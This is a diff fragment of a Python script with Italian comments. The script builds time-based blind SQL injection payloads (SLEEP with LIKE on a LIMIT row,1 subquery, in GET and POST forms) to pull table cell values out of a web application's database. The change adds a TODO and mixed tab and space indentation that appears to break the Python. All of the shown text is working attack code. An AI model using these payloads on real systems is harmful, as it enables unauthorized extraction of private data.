@@ -28,12 +28,14 @@ def findCellValue(url, tabledb_name, row, column_name, sleeptime):
         #A seconda del comando passato eseguo le query o in metodo GET o in metodo POST
         if(isGet):
             payload = '\' AND (SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ') -- -'
-        else:            
+        else:
+	    #TODO parametrizzare richiesta in POST
             payload={
                 'destin':'(SELECT SLEEP('+str(sleeptime)+') FROM dual WHERE (SELECT ' + column_name + ' FROM '+ tabledb_name +' LIMIT '+ str(row) +',1) LIKE ' + concatStr + ")",
                 'msg':'msg'
-            }
-
+            
+	    }
+	    
             #print(payload)
 
         #Quando la query fa a buon fine salvo la lunghezza trovata ( es.nome lenght nome DB )
